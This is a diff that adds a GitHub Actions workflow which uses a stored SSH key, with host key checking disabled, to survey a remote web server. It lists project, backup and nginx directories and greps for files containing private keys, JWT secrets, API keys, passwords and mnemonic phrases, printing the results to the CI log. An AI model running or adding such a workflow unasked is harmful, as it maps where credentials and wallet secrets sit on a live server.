@@ -1,0 +1,26 @@
+name: wwwaudit
+on:
+  push:
+    branches: [ 'ci-www-*' ]
+permissions:
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: wwwaudit
+        run: |
+          echo "${{ secrets.SERVER_SSH_KEY }}" > /tmp/k
+          chmod 600 /tmp/k
+          SSH="ssh -i /tmp/k -o StrictHostKeyChecking=no -o ConnectTimeout=15 ${{ secrets.SERVER_USER }}@${{ secrets.SERVER_HOST }}"
+          echo "=== dk_project tree ==="
+          $SSH 'find /www/dk_project -maxdepth 4 2>/dev/null | head -120'
+          echo "=== dk_project files ==="
+          $SSH 'find /www/dk_project -type f 2>/dev/null | head -100'
+          echo "=== dk_project secrets ==="
+          $SSH 'grep -rIlE "PRIVATE_KEY|JWT_SECRET|API_KEY|SECRET|PASSWORD|MNEMONIC" /www/dk_project 2>/dev/null | head -30'
+          echo "=== backup tree ==="
+          $SSH 'find /www/backup -maxdepth 3 2>/dev/null | head -80'
+          echo "=== wwwroot ==="
+          $SSH 'ls -la /www/wwwroot 2>/dev/null; ls -la /www/server/panel/vhost/nginx 2>/dev/null | head -30'
